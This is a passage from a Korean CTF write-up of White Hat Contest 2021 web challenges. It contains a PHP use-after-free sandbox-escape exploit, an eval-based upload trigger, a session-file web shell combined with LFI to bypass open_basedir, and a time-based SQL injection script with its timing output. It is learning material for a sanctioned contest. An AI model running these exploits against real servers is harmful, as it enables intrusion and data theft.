        <span class="nv">$p_vaddr</span> <span class="o">=</span> <span class="nf">read</span><span class="p">(</span><span class="nv">$header</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">);</span>
        <span class="nv">$p_memsz</span> <span class="o">=</span> <span class="nf">read</span><span class="p">(</span><span class="nv">$header</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>

        <span class="k">if</span><span class="p">(</span><span class="nv">$p_type</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nv">$p_flags</span> <span class="o">==</span> <span class="mi">6</span><span class="p">)</span> <span class="p">{</span> <span class="c1"># PT_LOAD, PF_Read_Write</span>
            <span class="c1"># handle pie</span>
            <span class="nv">$data_addr</span> <span class="o">=</span> <span class="nv">$e_type</span> <span class="o">==</span> <span class="mi">2</span> <span class="o">?</span> <span class="nv">$p_vaddr</span> <span class="o">:</span> <span class="nv">$base</span> <span class="o">+</span> <span class="nv">$p_vaddr</span><span class="p">;</span>
            <span class="nv">$data_size</span> <span class="o">=</span> <span class="nv">$p_memsz</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$p_type</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nv">$p_flags</span> <span class="o">==</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span> <span class="c1"># PT_LOAD, PF_Read_exec</span>
            <span class="nv">$text_size</span> <span class="o">=</span> <span class="nv">$p_memsz</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$data_addr</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$text_size</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$data_size</span><span class="p">)</span>
        <span class="k">die</span><span class="p">(</span><span class="s1">'Exploit failed: Unable to parse ELF'</span><span class="p">);</span>

    <span class="k">return</span> <span class="p">[</span><span class="nv">$data_addr</span><span class="p">,</span> <span class="nv">$text_size</span><span class="p">,</span> <span class="nv">$data_size</span><span class="p">];</span>
<span class="p">}</span>

<span class="k">function</span> <span class="n">get_basic_funcs</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="nv">$elf</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">list</span><span class="p">(</span><span class="nv">$data_addr</span><span class="p">,</span> <span class="nv">$text_size</span><span class="p">,</span> <span class="nv">$data_size</span><span class="p">)</span> <span class="o">=</span> <span class="nv">$elf</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$data_size</span> <span class="o">/</span> <span class="mi">8</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$leak</span> <span class="o">=</span> <span class="nf">read</span><span class="p">(</span><span class="nv">$data_addr</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$leak</span> <span class="o">-</span> <span class="nv">$base</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nv">$leak</span> <span class="o">&lt;</span> <span class="nv">$data_addr</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$deref</span> <span class="o">=</span> <span class="nf">read</span><span class="p">(</span><span class="nv">$leak</span><span class="p">);</span>
            <span class="c1"># 'constant' constant check</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$deref</span> <span class="o">!=</span> <span class="mh">0x746e6174736e6f63</span><span class="p">)</span>
                <span class="k">continue</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="k">continue</span><span class="p">;</span>

        <span class="nv">$leak</span> <span class="o">=</span> <span class="nf">read</span><span class="p">(</span><span class="nv">$data_addr</span> <span class="o">+</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$leak</span> <span class="o">-</span> <span class="nv">$base</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nv">$leak</span> <span class="o">&lt;</span> <span class="nv">$data_addr</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$deref</span> <span class="o">=</span> <span class="nf">read</span><span class="p">(</span><span class="nv">$leak</span><span class="p">);</span>
            <span class="c1"># 'bin2hex' constant check</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$deref</span> <span class="o">!=</span> <span class="mh">0x786568326e6962</span><span class="p">)</span>
                <span class="k">continue</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="k">continue</span><span class="p">;</span>

        <span class="k">return</span> <span class="nv">$data_addr</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">function</span> <span class="n">get_system</span><span class="p">(</span><span class="nv">$basic_funcs</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nv">$addr</span> <span class="o">=</span> <span class="nv">$basic_funcs</span><span class="p">;</span>
    <span class="k">do</span> <span class="p">{</span>
        <span class="nv">$f_entry</span> <span class="o">=</span> <span class="nf">read</span><span class="p">(</span><span class="nv">$addr</span><span class="p">);</span>
        <span class="nv">$f_name</span> <span class="o">=</span> <span class="nf">read</span><span class="p">(</span><span class="nv">$f_entry</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span>

        <span class="k">if</span><span class="p">(</span><span class="nv">$f_name</span> <span class="o">==</span> <span class="mh">0x6d6574737973</span><span class="p">)</span> <span class="p">{</span> <span class="c1"># system</span>
            <span class="k">return</span> <span class="nf">read</span><span class="p">(</span><span class="nv">$addr</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$addr</span> <span class="o">+=</span> <span class="mh">0x20</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">while</span><span class="p">(</span><span class="nv">$f_entry</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">function</span> <span class="n">get_system_address</span><span class="p">(</span><span class="nv">$binary_leak</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nv">$base</span> <span class="o">=</span> <span class="nf">get_binary_base</span><span class="p">(</span><span class="nv">$binary_leak</span><span class="p">);</span>
    <span class="k">print</span><span class="p">(</span><span class="s1">'ELF base: 0x'</span> <span class="mf">.</span><span class="nb">dechex</span><span class="p">(</span><span class="nv">$base</span><span class="p">)</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>
    <span class="nv">$elf</span> <span class="o">=</span> <span class="nf">parse_elf</span><span class="p">(</span><span class="nv">$base</span><span class="p">);</span>
    <span class="nv">$basic_funcs</span> <span class="o">=</span> <span class="nf">get_basic_funcs</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="nv">$elf</span><span class="p">);</span>
    <span class="k">print</span><span class="p">(</span><span class="s1">'Basic functions: 0x'</span> <span class="mf">.</span><span class="nb">dechex</span><span class="p">(</span><span class="nv">$basic_funcs</span><span class="p">)</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>
    <span class="nv">$zif_system</span> <span class="o">=</span> <span class="nf">get_system</span><span class="p">(</span><span class="nv">$basic_funcs</span><span class="p">);</span>
    <span class="k">return</span> <span class="nv">$zif_system</span><span class="p">;</span>
<span class="p">}</span>

<span class="nv">$dlls</span> <span class="o">=</span> <span class="p">[];</span>
<span class="nv">$strs</span> <span class="o">=</span> <span class="p">[];</span>
<span class="nv">$rw_dll</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SplDoublyLinkedList</span><span class="p">();</span>


<span class="c1"># Create a chain of dangling triggers, which will all in turn</span>
<span class="c1"># free current-&gt;next, push an element to the next list, and free current</span>
<span class="c1"># This will make sure that every current-&gt;next points the same memory block,</span>
<span class="c1"># which we will UAF.</span>
<span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="no">NB_DANGLING</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nv">$dlls</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SplDoublyLinkedList</span><span class="p">();</span>
    <span class="nv">$dlls</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">-&gt;</span><span class="nf">push</span><span class="p">(</span><span class="k">new</span> <span class="nc">DanglingTrigger</span><span class="p">(</span><span class="nv">$i</span><span class="p">));</span>
    <span class="nv">$dlls</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">-&gt;</span><span class="nb">rewind</span><span class="p">();</span>
<span class="p">}</span>

<span class="c1"># We want our UAF'd list element to be before two strings, so that we can</span>
<span class="c1"># obtain the address of the first string, and increase is size. We then have</span>
<span class="c1"># R/W over all memory after the obtained address.</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'NB_STRS'</span><span class="p">,</span> <span class="mi">50</span><span class="p">);</span>
<span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="no">NB_STRS</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nv">$strs</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">str_shuffle</span><span class="p">(</span><span class="nb">str_repeat</span><span class="p">(</span><span class="s1">'A'</span><span class="p">,</span> <span class="no">SIZE_ELEM_STR</span><span class="p">));</span>
    <span class="nf">i2s</span><span class="p">(</span><span class="nv">$strs</span><span class="p">[</span><span class="nv">$i</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="no">STR_MARKER</span><span class="p">);</span>
    <span class="nf">i2s</span><span class="p">(</span><span class="nv">$strs</span><span class="p">[</span><span class="nv">$i</span><span class="p">],</span> <span class="mi">8</span><span class="p">,</span> <span class="nv">$i</span><span class="p">,</span> <span class="mi">7</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1"># Free one string in the middle, ...</span>
<span class="nv">$strs</span><span class="p">[</span><span class="no">NB_STRS</span> <span class="o">-</span> <span class="mi">20</span><span class="p">]</span> <span class="o">=</span> <span class="mi">123</span><span class="p">;</span>
<span class="c1"># ... and put the to-be-UAF'd list element instead.</span>
<span class="nv">$dlls</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="nf">push</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>

<span class="c1"># Setup the last DLlist, which will exploit the UAF</span>
<span class="nv">$dlls</span><span class="p">[</span><span class="no">NB_DANGLING</span><span class="p">]</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SplDoublyLinkedList</span><span class="p">();</span>
<span class="nv">$dlls</span><span class="p">[</span><span class="no">NB_DANGLING</span><span class="p">]</span><span class="o">-&gt;</span><span class="nf">push</span><span class="p">(</span><span class="k">new</span> <span class="nc">UAFTrigger</span><span class="p">());</span>
<span class="nv">$dlls</span><span class="p">[</span><span class="no">NB_DANGLING</span><span class="p">]</span><span class="o">-&gt;</span><span class="nb">rewind</span><span class="p">();</span>

<span class="c1"># Trigger the bug on the first list</span>
<span class="nv">$dlls</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="nf">offsetUnset</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="k">die</span><span class="p">();</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">requests</span>

<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
    <span class="sh">'</span><span class="s">payload</span><span class="sh">'</span><span class="p">:</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">uaf.php</span><span class="sh">'</span><span class="p">).</span><span class="nf">read</span><span class="p">().</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s">&lt;?php</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">)</span>
<span class="p">}</span>

<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="sh">"</span><span class="s">http://3.38.109.135:28344/data/bf233c59229bbbbe50aa44971fbb17c2/40977f3b892bcbc3edd5fd4f1d3abe38.pht?code=eval($_POST[</span><span class="sh">'</span><span class="s">payload</span><span class="sh">'</span><span class="s">]);</span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p><a href="https://github.com/P0cas/ctf/blob/main/2021/White%20Hat%20Contest%202021/Mudbox/flag.png?raw=true" class="popup img-link  shimmer"><img src="https://github.com/P0cas/ctf/blob/main/2021/White%20Hat%20Contest%202021/Mudbox/flag.png?raw=true" alt="" loading="lazy"></a></p>

<p>위 poc 코드를 실행 시켜주면 UAF Sandbox Escape 공격으로 플래그를 읽어오는 것을 볼 수 있습니다.</p>

<hr />
<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="k">echo</span> <span class="nb">session_save_path</span><span class="p">()</span><span class="mf">.</span><span class="s2">"&lt;br&gt;"</span><span class="p">;</span>
<span class="nb">mkdir</span><span class="p">(</span><span class="s2">"a"</span><span class="p">);</span>
<span class="nb">mkdir</span><span class="p">(</span><span class="s2">"a/b"</span><span class="p">);</span>
<span class="nb">chdir</span><span class="p">(</span><span class="s2">"a/b/"</span><span class="p">);</span>
<span class="nb">session_save_path</span><span class="p">(</span><span class="s2">"../../plugin"</span><span class="p">);</span>
<span class="nb">chdir</span><span class="p">(</span><span class="s2">"../.."</span><span class="p">);</span>
<span class="nb">session_start</span><span class="p">();</span>
<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'test'</span><span class="p">]</span><span class="o">=</span><span class="s2">"&lt;?php include(</span><span class="se">\"</span><span class="s2">/flag</span><span class="se">\"</span><span class="s2">); ?&gt;"</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>두 번째 , open_basedir 우회하는 방식은 <code class="language-plaintext highlighter-rouge">session_save_path()</code> 함수를 이용해서 세션 파일을 원하는 곳에 생성 시켜 우회하는 방식입니다. 일단 위 페이로드를 이용해서 ‘plugin/’ 디렉터리에 세션 파일로 웹쉘을 생성을 합니다.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>

<span class="nv">$p</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">"p"</span><span class="p">]</span> <span class="o">??</span> <span class="s2">"about"</span><span class="p">;</span>

<span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/[^A-Za-z0-9\-_]/"</span><span class="p">,</span> <span class="nv">$p</span><span class="p">))</span>
    <span class="nv">$p</span> <span class="o">=</span> <span class="s2">"about"</span><span class="p">;</span>

<span class="k">include</span> <span class="s2">"./</span><span class="nv">$p</span><span class="s2">"</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div>
<p><code class="language-plaintext highlighter-rouge">/plugin</code>에 인덱스 파일을 보면 입력값에 문자열 및 ‘-‘, ‘_’ 문자열만 포함되어 있어야 하고, include를 이용해서 입력값에 대한 파일을 가져오는 것을 알 수 있습니다. 그렇기 때문에 위에서 올린 세션 파일을 LFI를 이용해 가져와 실행 시키면 플래그를 획득할 수 있습니다. 세션 파일명은 <code class="language-plaintext highlighter-rouge">(sess_phpsessid)</code> 입니다.</p>

<p><a href="https://github.com/P0cas/ctf/blob/main/2021/White%20Hat%20Contest%202021/Mudbox/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202021-09-12%20%EC%98%A4%ED%9B%84%205.53.30.png?raw=true" class="popup img-link  shimmer"><img src="https://github.com/P0cas/ctf/blob/main/2021/White%20Hat%20Contest%202021/Mudbox/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202021-09-12%20%EC%98%A4%ED%9B%84%205.53.30.png?raw=true" alt="" loading="lazy"></a></p>

<p>일단 위 코드를 pht 확장자로 업로드 합니다.</p>

<p><a href="https://github.com/P0cas/ctf/blob/main/2021/White%20Hat%20Contest%202021/Mudbox/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202021-09-12%20%EC%98%A4%ED%9B%84%205.55.27.png?raw=true" class="popup img-link  shimmer"><img src="https://github.com/P0cas/ctf/blob/main/2021/White%20Hat%20Contest%202021/Mudbox/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202021-09-12%20%EC%98%A4%ED%9B%84%205.55.27.png?raw=true" alt="" loading="lazy"></a></p>

<p>파일을 실행 하고, LFI 취약점을 이용해 파일을 실행 하니 플래그가 출력되는 것을 볼 수 있습니다.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>FLAG{b4s3dir_i5_n0t_s4fe_h4h4}
</pre></td></tr></tbody></table></code></div></div>

<hr />
<h1 id="web-bittrader-482-pts">(Web) BitTrader [482 pts]</h1>

<blockquote>
  <p>BitTrader 문제는 join을 이용해서 테이블을 여러개 조인 해 줄 경우 발생하는 슬립 현상을 이용해서 Time Based SQL Injection을 하는 문제 입니다.</p>
</blockquote>

<p>해당 문제는 대회 당시에 Mudbox와 다르게 그냥 감 자체를 잡지 못 했고, 공부용으로도 너무 좋은 문제라서 대회가 끝났지만 계속 풀어보기로 했습니다. 일단 대회 당시에 SQL Injection인 것을 알았지만 어떤 식으로 데이터를 추출해야 하는 지 알지 못 했습니다.</p>

<p><a href="https://media.discordapp.net/attachments/857916308892418071/887238980481978418/1.png?width=1588&amp;height=1077" class="popup img-link  shimmer"><img src="https://media.discordapp.net/attachments/857916308892418071/887238980481978418/1.png?width=1588&amp;height=1077" alt="" loading="lazy"></a></p>

<p>일단 문제 페이지를 보면 위와 같이 비트코인, 이더리움, 리플, 도지 코인의 현재 가격을 출력해주는 것을 확인할 수 있습니다.</p>

<p><a href="https://media.discordapp.net/attachments/857916308892418071/887238991072591893/2.png?width=1780&amp;height=1075" class="popup img-link  shimmer"><img src="https://media.discordapp.net/attachments/857916308892418071/887238991072591893/2.png?width=1780&amp;height=1075" alt="" loading="lazy"></a></p>

<p>그리고 Trade 버튼을 클릭하면 특정 코인의 가격을 5초 간격으로 나타나는 지표를 확인할 수 있으며, 네트워크 창을 확인 해보면 api(ajax_ticks.php?symbol=btc)로 요청 해서 코인의 현재 가격을 가져 오는 것을 확인할 수 있습니다.</p>

<p><a href="https://media.discordapp.net/attachments/857916308892418071/887238987121577984/3.png?width=1780&amp;height=1075" class="popup img-link  shimmer"><img src="https://media.discordapp.net/attachments/857916308892418071/887238987121577984/3.png?width=1780&amp;height=1075" alt="" loading="lazy"></a></p>

<p><code class="language-plaintext highlighter-rouge">/ajax_ticks.php?symbol=btc</code>로 접속을 하면 위와 같이 결과 값을 반환하는 것을 확인할 수 있습니다.</p>

<p><a href="https://media.discordapp.net/attachments/857916308892418071/887238985599033344/4.png?width=1780&amp;height=1075" class="popup img-link  shimmer"><img src="https://media.discordapp.net/attachments/857916308892418071/887238985599033344/4.png?width=1780&amp;height=1075" alt="" loading="lazy"></a></p>

<p>그래서 여기가 SQL Injection 공격 포인트라 생각하고, 여러 페이로드를 보내면서 익스를 시도 하였지만 성공하지 못 했습니다. 일단 대부분에 특수 문자가 막혀 있기 때문에 싱글 쿼터 및 함수 자체를 사용할 수 없었습니다.</p>

<div class="language-sql highlighter-rouge"><div class="code-header">
        <span data-label-text="Sql"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="o">~~</span> <span class="k">FROM</span> <span class="n">price_</span><span class="err">$</span><span class="n">symbol</span> <span class="k">limit</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">10</span>
</pre></td></tr></tbody></table></code></div></div>
<p>하지만 symbol의 값이 where 절에 들어가는 것이 아닌 위와 같이 테이블 명에 들어가기 때문에 싱글 쿼터를 우회할 필요가 없었으며 익스플로잇은 join을 이용해 테이블 여러개를 조인 시켜 줄 경우에 발생하는 에러 또는 슬립 현상을 이용해 Error/Time Based SQL Injection을 이용해야 했습니다. 저는 슬립 현상을 이용해서 타임어택을 하였지만 효율성은 에러를 이용하는 것이 좋아 보입니다.</p>

<p><a href="https://media.discordapp.net/attachments/857916308892418071/887238968624689182/5.png?width=1794&amp;height=209" class="popup img-link  shimmer"><img src="https://media.discordapp.net/attachments/857916308892418071/887238968624689182/5.png?width=1794&amp;height=209" alt="" loading="lazy"></a></p>

<div class="language-sql highlighter-rouge"><div class="code-header">
        <span data-label-text="Sql"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">cross</span> <span class="k">join</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">cross</span> <span class="k">join</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">on</span> <span class="mi">1</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">cross</span> <span class="k">join</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">cross</span> <span class="k">join</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">on</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div>
<p>일단 로컬에서 cross join을 이용해 메타 테이블들을 이어주는 퀴러를 위와 같이 작성 해 테스트를 해보았습니다. 사진을 보면 거짓일 때는, 쿼리 실행이 바로 종료 되지만, 참일 때는 오랜시간 슬립 현상이 발생하는 것을 확인할 수 있었습니다.</p>

<p>그렇기 때문에 이를 이용해서 Time Based SQL Injection을 이용해 디비 정보를 모두 추출하면 됩니다.</p>

<p><a href="https://media.discordapp.net/attachments/857916308892418071/887238988874784768/6.png?width=1794&amp;height=1063" class="popup img-link  shimmer"><img src="https://media.discordapp.net/attachments/857916308892418071/887238988874784768/6.png?width=1794&amp;height=1063" alt="" loading="lazy"></a></p>

<div class="language-sql highlighter-rouge"><div class="code-header">
        <span data-label-text="Sql"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">btc</span> <span class="k">cross</span> <span class="k">join</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">cross</span> <span class="k">join</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">on</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span>
</pre></td></tr></tbody></table></code></div></div>
<p>그래서 <code class="language-plaintext highlighter-rouge">cross join</code>을 이용하여 위와 같이 메타 테이블 2개를 엮어주는 쿼리를 전송해주니 약 4초 정도 Sleep이 발생하는 것을 볼 수 있습니다. 이제 이를 이용해서 Time Based SQL Injection을 하면 될 거 같습니다 :)</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">string</span>

<span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://15.165.49.138:26354/ajax_ticks.php?symbol=btc cross join information_schema.statistics cross join information_schema.processlist cross join information_schema.tables as m cross join information_schema.columns on m.table_name like 0x{}</span><span class="sh">"</span>

<span class="n">leaked</span> <span class="o">=</span> <span class="sh">""</span>
<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">printable</span><span class="p">:</span>
        <span class="n">f</span> <span class="o">=</span> <span class="n">url</span><span class="p">.</span><span class="nf">format</span><span class="p">((</span><span class="n">leaked</span> <span class="o">+</span> <span class="n">s</span> <span class="o">+</span> <span class="sh">'</span><span class="s">%</span><span class="sh">'</span><span class="p">).</span><span class="nf">encode</span><span class="p">().</span><span class="nf">hex</span><span class="p">())</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">C: </span><span class="si">{</span><span class="n">s</span><span class="si">}</span><span class="s">, T: </span><span class="si">{</span><span class="n">r</span><span class="p">.</span><span class="n">elapsed</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>
<p>일단 테이블 명의 첫 글자들을 확인하기 위해 위와 같이 코드를 작성하였습니다. 그리고 문제에서는 테이블/컬럼 명, 레코드 값을 뽑을 때는 두 개의 테이블로는 크기가 부족해서 <code class="language-plaintext highlighter-rouge">statistics</code>, <code class="language-plaintext highlighter-rouge">processlist</code> 테이블을 추가로 조인 시켜 주었으며 위와 같이 PoC 코드를 작성해주었습니다.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
</pre></td><td class="rouge-code"><pre>C: 0, T: 0:00:00.040496
C: 1, T: 0:00:00.039568
C: 2, T: 0:00:00.033084
C: 3, T: 0:00:00.054973
C: 4, T: 0:00:00.040466
C: 5, T: 0:00:00.033778
C: 6, T: 0:00:00.036218
C: 7, T: 0:00:00.039113
C: 8, T: 0:00:00.039524
C: 9, T: 0:00:00.043274
C: a, T: 0:00:00.042083
C: b, T: 0:00:00.037688
C: c, T: 0:00:02.985553
C: d, T: 0:00:00.041576
C: e, T: 0:00:03.037683
C: f, T: 0:00:03.260697
C: g, T: 0:00:03.217965
C: h, T: 0:00:00.036901
C: i, T: 0:00:02.984188
C: j, T: 0:00:00.042655
C: k, T: 0:00:01.794134
C: l, T: 0:00:01.048942
C: m, T: 0:00:00.036848
C: n, T: 0:00:00.037003
C: o, T: 0:00:01.728545
C: p, T: 0:00:03.069760
C: q, T: 0:00:00.046779
C: r, T: 0:00:03.427775
C: s, T: 0:00:02.869415
C: t, T: 0:00:02.965769
C: u, T: 0:00:01.839867
C: v, T: 0:00:02.045197
C: w, T: 0:00:00.045391
C: x, T: 0:00:00.038370
C: y, T: 0:00:00.034550
C: z, T: 0:00:00.040592
C: A, T: 0:00:00.038777
C: B, T: 0:00:00.035266
